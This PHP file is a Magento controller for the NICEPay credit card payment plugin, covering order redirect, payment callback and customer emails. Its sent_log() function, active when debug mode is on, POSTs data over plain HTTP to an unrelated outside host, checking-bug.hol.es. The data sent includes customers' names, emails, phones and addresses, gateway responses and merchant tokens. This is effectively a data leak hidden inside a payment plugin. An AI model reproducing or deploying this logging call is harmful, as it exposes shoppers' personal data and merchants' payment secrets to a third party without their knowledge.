<?php
/*
NICEPay Credit Card Controller
By: PT. NICEPay
www.nicepay.co.id
*/

class Nicepay_CreditCard_PaymentController extends Mage_Core_Controller_Front_Action{
	// The redirect action is triggered when someone places an order
	public function redirectAction() {
		$this->includes();

		$js_base_url = Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_JS);
		Mage::register('js_base_url',$js_base_url);

		$orderid = Mage::getSingleton('checkout/session')->getLastRealOrderId();
		$order = Mage::getModel('sales/order')->loadByIncrementId($orderid);

		$filename = Mage::getBaseDir('log').'/'.$orderid.'.txt';
		if (file_exists($filename)) {
			// Flag the order as 'cancelled' and save it
			$order = Mage::getModel('sales/order')->loadByIncrementId($orderid);
			$order->setData('state', "canceled");
			$order->setStatus("canceled");

			$history = $order->addStatusHistoryComment('Order was set to Canceled by NICEPay Plugin. Because Customer click button back', false);
			$history->setIsCustomerNotified(false);
			$order->save();

			$deletefile = Mage::getBaseDir('log').'/'.($orderid-2).'.txt';
			if (file_exists($deletefile)) {
				unlink($deletefile);
			}

			if($order->getCustomerIsGuest()){
				$this->_redirect("/");
			}else{
				Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('customer/account/index'));
			}
		} else {
			file_put_contents($filename, $orderid);
		}

		// $line_number = 0;
		// if ($handle = fopen(Mage::getBaseDir('log').'/nicepay_log_order.txt', 'r')) {
		//    $count = 0;
		//    while (($line = fgets($handle, 4096)) !== FALSE and !$line_number) {
		//       $count++;
		//       $line_number = (strpos($line, $orderid) !== FALSE) ? $count : $line_number;
		//    }
		//    fclose($handle);
		// }
		// if ($line_number == 1) {
		// 	// Flag the order as 'cancelled' and save it
		// 	$order = Mage::getModel('sales/order')->loadByIncrementId($orderid);
		// 	$order->setData('state', "canceled");
		// 	$order->setStatus("canceled");
		//
		// 	$history = $order->addStatusHistoryComment('Order was set to Canceled by NICEPay Plugin. Because Customer click button back', false);
		// 	$history->setIsCustomerNotified(false);
		// 	$order->save();
		//
		// 	if($order->getCustomerIsGuest()){
		// 		$this->_redirect("/");
		// 	}else{
		// 		Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('customer/account/index'));
		// 	}
		// }

		//running debug
		$nicepay_log["redirect"] = "callback";
		$nicepay_log["referenceNo"] = $orderid;
		$nicepay_log["isi"] = $_SERVER["REQUEST_URI"];
		$this->sent_log(json_encode($nicepay_log));

		$grandTotal = (int)$order->getGrandTotal();
		$shippingAmount = (int)$order->getShippingAmount();
		$shippingDesc = $order->getShippingDescription();
		$discountAmount = (int)$order->getDiscountAmount();
		$discountDesc = $order->getDiscountDescription();
		$orderCurrency = $order->getOrderCurrency()->getData()["currency_code"];

		//send email
		if($order->getStatus() != 'canceled'){
			$this->sentNewOrderEmail($order);
		}

		$items = $order->getAllVisibleItems();
		$cartData["count"] = count($items);
		foreach($items as $i){
			$productId = $i->getProductId();

			//Get Producet Image Url
			$product = Mage::getModel('catalog/product')->load($productId);
			$productMediaConfig = Mage::getModel('catalog/product_media_config');
			$baseImageUrl = $productMediaConfig->getMediaUrl($product->getImage());
			$smallImageUrl = $productMediaConfig->getMediaUrl($product->getSmallImage());
			$thumbnailUrl = $productMediaConfig->getMediaUrl($product->getThumbnail());

			$cartData["item"][] = array(
				"img_url" => $thumbnailUrl,
				"goods_name" => $i->getName(),
				"goods_detail" => "SKU:".$i->getSku()." (".(int)$i->getQtyOrdered()." Items)",
				"goods_amt" => (int)$i->getQtyOrdered() * (int)$i->getPrice()
			);
		}

		if($discountAmount != 0){
			$cartData["item"][] = array(
				"img_url" => $js_base_url."nicepay/coupon.png",
				"goods_name" => "DISCOUNT COUPON",
				"goods_detail" => $discountDesc,
				"goods_amt" => $discountAmount
			);
		}

		if($shippingAmount > 0){
			$cartData["item"][] = array(
				"img_url" => $js_base_url."nicepay/delivery.png",
				"goods_name" => "SHIPPING",
				"goods_detail" => $shippingDesc,
				"goods_amt" => $shippingAmount
			);
		}

		$customerId = $order->getCustomerId();
		$customer = Mage::getModel('customer/customer')->load($customerId);

		if($order->getCustomerIsGuest()){
			$billing = $order->getBillingAddress()->getData();
			$shipping = $order->getShippingAddress()->getData();
		}else{
			$billing = $customer->getPrimaryBillingAddress()->getData();
			$billing['email'] = $order->getBillingAddress()->getEmail();
			$shipping = $customer->getPrimaryShippingAddress()->getData();
			$shipping['email'] = $order->getShippingAddress()->getEmail();
		}

		//Set Billing Address
		$name = $billing['firstname']." ".$billing['middlename']." ".$billing['lastname'];
		$billingNm = $this->checkingAddrRule("name", $name);

		$billingEmail = $billing['email'];

		$phone = $billing['telephone'];
		$billingPhone = $this->checkingAddrRule("phone", $phone);

		$addr = $billing['street'];
		$billingAddr = $this->checkingAddrRule("addr", $addr);

		$country = $billing['country_id'];
		$billingCountry = $this->checkingAddrRule("country", $country);

		$state = $billing['region'];
		$billingState = $this->checkingAddrRule("state", $state);

		$city = $billing['city'];
		$billingCity = $this->checkingAddrRule("city", $city);

		$postCd = $billing['postcode'];
		$billingPostCd = $this->checkingAddrRule("postCd", $postCd);

		//Set Shipping Address
		$name = $shipping['firstname']." ".$shipping['middlename']." ".$shipping['lastname'];
		$deliveryNm = $this->checkingAddrRule("name", $name);

		$addr = $shipping['street'];
		$deliveryAddr = $this->checkingAddrRule("addr", $addr);

		$city = $shipping['city'];
		$deliveryCity = $this->checkingAddrRule("city", $city);

		$country = $shipping['country_id'];
		$deliveryCountry = $this->checkingAddrRule("country", $country);

		$state = $shipping['region'];
		$deliveryState = $this->checkingAddrRule("state", $state);

		$deliveryEmail = $shipping['email'];

		$phone = $shipping['telephone'];
		$deliveryPhone = $this->checkingAddrRule("phone", $phone);

		$postCd = $shipping['postcode'];
		$deliveryPostCd = $this->checkingAddrRule("postCd", $postCd);

		$nicepay = new NicepayLib();

		// Populate Mandatory parameters to send
		$nicepay->set('payMethod', '01');
		$nicepay->set('currency', $orderCurrency);
		$nicepay->set('cartData', json_encode($cartData));
		$nicepay->set('amt', $grandTotal); // Total gross amount //
		$nicepay->set('referenceNo', $orderid);
		$nicepay->set('description', 'Payment of invoice No '.$orderid); // Transaction description

		$nicepay->callBackUrl = Mage::getUrl('checkout/onepage/success', array('_secure'=>true));
		$nicepay->dbProcessUrl = Mage::getUrl('creditcard/payment/callback', array('_secure' => true));
		$nicepay->set('billingNm', $billingNm); // Customer name
		$nicepay->set('billingPhone', $billingPhone); // Customer phone number
		$nicepay->set('billingEmail', $billingEmail); //
		$nicepay->set('billingAddr', $billingAddr);
		$nicepay->set('billingCity', $billingCity);
		$nicepay->set('billingState', $billingState);
		$nicepay->set('billingPostCd', $billingPostCd);
		$nicepay->set('billingCountry', $billingCountry);

		$nicepay->set('deliveryNm', $deliveryNm); // Delivery name
		$nicepay->set('deliveryPhone', $deliveryPhone);
		$nicepay->set('deliveryEmail', $deliveryEmail);
		$nicepay->set('deliveryAddr', $deliveryAddr);
		$nicepay->set('deliveryCity', $deliveryCity);
		$nicepay->set('deliveryState', $deliveryState);
		$nicepay->set('deliveryPostCd', $deliveryPostCd);
		$nicepay->set('deliveryCountry', "indonesia");//$deliveryCountry

		//running debug
		$nicepay_log["isi"] = $nicepay;
		$this->sent_log(json_encode($nicepay_log));

		// Send Data
		$response = $nicepay->chargeCard();

		$filename = Mage::getBaseDir('log').'/nicepay_log_order.txt';
		$current = file_get_contents($filename);
		$current .= $orderid."\n";
		file_put_contents($filename, $current);

		//running debug
		$nicepay_log["isi"] = $response;
		$this->sent_log(json_encode($nicepay_log));

		// Response from NICEPAY
		if(isset($response->data->resultCd) && $response->data->resultCd == "0000"){
			// please save tXid in your database
		    // echo "<pre>";
		    // echo "tXid              : $response->tXid\n";
		    // echo "API Type          : $response->apiType\n";
		    // echo "Request Date      : $response->requestDate\n";
		    // echo "Response Date     : $response->requestDate\n";
		    // echo "</pre>";
			Mage::register("nicepay", $response->data);
			Mage::register('return_base_url', $response->data->requestURL);
			Mage::register('tXid', $response->tXid);
			$template = 'creditcard/redirect.phtml';
		}elseif(isset($response->data->resultCd)){
			// API data not correct or error happened in bank system, you can redirect back to checkout page or echo error message.
			// In this sample, we echo error message
			// header("Location: "."http://example.com/checkout.php");
			Mage::register('result_code', $response->data->resultCd);
			Mage::register('result_msg', $response->data->resultMsg);
			$template = 'creditcard/error.phtml';
		}else{
			// Timeout, you can redirect back to checkout page or echo error message.
			// In this sample, we echo error message
			// header("Location: "."http://example.com/checkout.php");
			Mage::register('connect_timeout', "Connection Timeout. Please Try again.");
			$template = 'creditcard/connect.phtml';
		}

		$this->loadLayout();
        $block = $this->getLayout()->createBlock('Mage_Core_Block_Template','creditcard',array('template' => $template));
		$this->getLayout()->getBlock('content')->append($block);
        $this->renderLayout();
	}

	public function callbackAction() {
		$this->includes();

		$nicepay = new NicepayLib();

		// Listen for parameters passed
		$pushParameters = array(
			'tXid',
			'referenceNo',
			'amt',
			'merchantToken'
		);

		$nicepay->extractNotification($pushParameters);

		$iMid               = $nicepay->iMid;
		$tXid               = $nicepay->getNotification('tXid');
		$referenceNo        = $nicepay->getNotification('referenceNo');
		$amt                = $nicepay->getNotification('amt');
		$pushedToken        = $nicepay->getNotification('merchantToken');

		//running debug
		$nicepay_log["redirect"] = "dbproccess";
		$nicepay_log["referenceNo"] = $referenceNo;
		$nicepay_log["isi"] = $_SERVER["REQUEST_URI"];
		$this->sent_log(json_encode($nicepay_log));

		$nicepay->set('tXid', $tXid);
		$nicepay->set('referenceNo', $referenceNo);
		$nicepay->set('amt', $amt);
		$nicepay->set('iMid',$iMid);

		$merchantToken = $nicepay->merchantTokenC();
  	$nicepay->set('merchantToken', $merchantToken);

		//running debug
		$nicepay_log["isi"] = $pushedToken ." == ". $merchantToken;
		$this->sent_log(json_encode($nicepay_log));

		// <RESQUEST to NICEPAY>
		$paymentStatus = $nicepay->checkPaymentStatus($tXid, $referenceNo, $amt);

		//running debug
		$nicepay_log["isi"] = $paymentStatus;
		$this->sent_log(json_encode($nicepay_log));

		if($pushedToken == $merchantToken) {
			if (isset($paymentStatus->status) && $paymentStatus->status == '0'){
				// Payment was successful, so update the order's state, send order email and move to the success page
				$status = Mage::getConfig()->getNode('default/payment/creditcard')->payment_success_status;
				$order = Mage::getModel('sales/order')->loadByIncrementId($referenceNo);

				if($order->getStatus() != $status){
					$order->setData('state', $status);
					$order->setStatus($status);

					$history = $order->addStatusHistoryComment('Order was set to '.$status.' by NICEPay Credit Card Payment.', false);
					$history->setIsCustomerNotified(false);
					$order->save();

					$this->sentUpdateOrderEmail($order);
				}
			}else{
				// Flag the order as 'cancelled' and save it
				$order = Mage::getModel('sales/order')->loadByIncrementId($referenceNo);
				$order->setData('state', "canceled");
				$order->setStatus("canceled");

				$history = $order->addStatusHistoryComment('Order was set to Canceled by NICEPay Credit Card Payment.', false);
				$history->setIsCustomerNotified(false);
				$order->save();

				$this->sentUpdateOrderEmail($order);
			}
		}
	}

	public function includes(){
		$libDir = Mage::getBaseDir('lib')."/";
		require_once($libDir."Nicepay_CreditCard/NicepayLib.php");
	}

	public function sentNewOrderEmail($order){
		// This is the template name from your etc/config.xml
		$template_id = 'nicepay_order_new_email';

		$customerId = $order->getCustomerId();
		$customer = Mage::getModel('customer/customer')->load($customerId);
		if($order->getCustomerIsGuest()){
			$billing = $order->getBillingAddress()->getData();
			$shipping = $order->getShippingAddress()->getData();
		}else{
			$billing = $customer->getPrimaryBillingAddress()->getData();
			$billing['email'] = $order->getBillingAddress()->getEmail();
			$shipping = $customer->getPrimaryShippingAddress()->getData();
			$shipping['email'] = $order->getShippingAddress()->getEmail();
		}
		$billingNm = $billing['firstname']." ".$billing['middlename']." ".$billing['lastname'];
		$billingEmail = $billing['email'];

		// Who were sending to...
		$receiveEmail = $billingEmail;
		$receiveName   = $billingNm;

		$storeId = Mage::app()->getStore()->getId();
		$sender_name = Mage::getStoreConfig('trans_email/ident_general/name', $storeId);
		$sender_email = Mage::getStoreConfig('trans_email/ident_general/email', $storeId);

		// Load our template by template_id
		$emailTemplate = Mage::getModel('core/email_template')->loadDefault($template_id);

		$orderId = $order->getIncrementId();
		$method = $order->getPayment()->getMethod();
		$payment = $order->getPayment();
		$payment->getData($method);
		$payment_name = $payment->getMethodInstance()->getTitle();

		$comment = "Berhasil !!!";
		// Here is where we can define custom variables to go in our email template!
		$variables = array(
			'order' => $order,
			'store_name' => $sender_name,
			'store_email' => $sender_email,
			'payment_html' => $payment_name
		);

		$processedTemplate = $emailTemplate->getProcessedTemplate($variables);

		//Sending E-Mail to Customers.
		$mail = Mage::getModel('core/email')
		 ->setToName($receiveName)
		 ->setToEmail($receiveEmail)
		 ->setBody($processedTemplate)
		 ->setSubject('New Order #'.$orderId)
		 ->setFromEmail($sender_email)
		 ->setFromName($sender_name)
		 ->setType('html');

		try{
			//Confimation E-Mail Send
			$mail->send($template_id);
		}catch(Exception $error){
			Mage::getSingleton('core/session')->addError($error->getMessage());
			return false;
		}
	}

	public function sentUpdateOrderEmail($order){
		// This is the template name from your etc/config.xml
		$template_id = 'nicepay_order_status_email';

		$customerId = $order->getCustomerId();
		$customer = Mage::getModel('customer/customer')->load($customerId);
		if($order->getCustomerIsGuest()){
			$billing = $order->getBillingAddress()->getData();
			$shipping = $order->getShippingAddress()->getData();
		}else{
			$billing = $customer->getPrimaryBillingAddress()->getData();
			$billing['email'] = $order->getBillingAddress()->getEmail();
			$shipping = $customer->getPrimaryShippingAddress()->getData();
			$shipping['email'] = $order->getShippingAddress()->getEmail();
		}
		$billingNm = $billing['firstname']." ".$billing['middlename']." ".$billing['lastname'];
		$billingEmail = $billing['email'];

		// Who were sending to...
		$receiveEmail = $billingEmail;
		$receiveName   = $billingNm;

		$storeId = Mage::app()->getStore()->getId();
		$sender_name = Mage::getStoreConfig('trans_email/ident_general/name', $storeId);
		$sender_email = Mage::getStoreConfig('trans_email/ident_general/email', $storeId);

		// Load our template by template_id
		$emailTemplate = Mage::getModel('core/email_template')->loadDefault($template_id);

		$orderId = $order->getIncrementId();
		$comment = "Berhasil !!!";
		// Here is where we can define custom variables to go in our email template!
		$variables = array(
			'order' => $order,
			//'comment' => $comment,
			'store_name' => $sender_name,
			'store_email' => $sender_email
		);

		$processedTemplate = $emailTemplate->getProcessedTemplate($variables);

		//Sending E-Mail to Customers.
		$mail = Mage::getModel('core/email')
		 ->setToName($receiveName)
		 ->setToEmail($receiveEmail)
		 ->setBody($processedTemplate)
		 ->setSubject('Update Status Order #'.$orderId)
		 ->setFromEmail($sender_email)
		 ->setFromName($sender_name)
		 ->setType('html');

		try{
			//Confimation E-Mail Send
			$mail->send($template_id);
		}catch(Exception $error){
			Mage::getSingleton('core/session')->addError($error->getMessage());
			return false;
		}
	}

	public function addrRule(){
		$addrRule = array(
			"name" => (object) array(
				"type" => "string",
				"length" => 30,
				"defaultValue" => "dummy"
			),
			"phone" => (object) array(
				"type" => "string",
				"length" => 15,
				"defaultValue" => "00000000000"
			),
			"addr" => (object) array(
				"type" => "string",
				"length" => 100,
				"defaultValue" => "dummy"
			),
			"city" => (object) array(
				"type" => "string",
				"length" => 50,
				"defaultValue" => "dummy"
			),
			"state" => (object) array(
				"type" => "string",
				"length" => 50,
				"defaultValue" => "dummy"
			),
			"postCd" => (object) array(
				"type" => "string",
				"length" => 10,
				"defaultValue" => "000000"
			),
			"country" => (object) array(
				"type" => "string",
				"length" => 10,
				"defaultValue" => "dummy"
			)
		);

		return $addrRule;
	}

	public function checkingAddrRule($var, $val){
		$value = null;

		$rule = $this->addrRule();
		$type = $rule[$var]->type;
		$length =(int)$rule[$var]->length;

		$defaultValue = $rule[$var]->defaultValue;
		if($val == null || $val == "" || "null" == $val){
			$val = $defaultValue;
		}

		switch($type){
			case "string" :
				$valLength = strlen($val);
				if($valLength > $length){
					$val = substr($val, 0, $length);
				}

				$value = (string)$val;
			break;

			case "integer" :
				if(gettype($val) != "string" || gettype($val) != "String"){
					$val = (string)$val;
				}

				$valLength = strlen($val);
				if($valLength > $length){
					$val = substr($val, 0, $length);
				}

				$value = (int)$val;
			break;

			default:
				$value = (string)$val;
			break;
		}

		return $value;
	}

	public function sent_log($data){
		$debugMode = Mage::getConfig()->getNode('default/payment/creditcard')->nicepay_debug;
		if($debugMode == 1){
			$ch = curl_init();
			//set the url, number of POST vars, POST data

			curl_setopt($ch,CURLOPT_URL, "http://checking-bug.hol.es/proc.php");
			curl_setopt($ch,CURLOPT_POST, 1);
			curl_setopt($ch,CURLOPT_POSTFIELDS, "log=".$data."++--++debug==".$debugMode);

			//execute post
			$result = curl_exec($ch);

			//close connection
			curl_close($ch);
		}
	}

}
?>
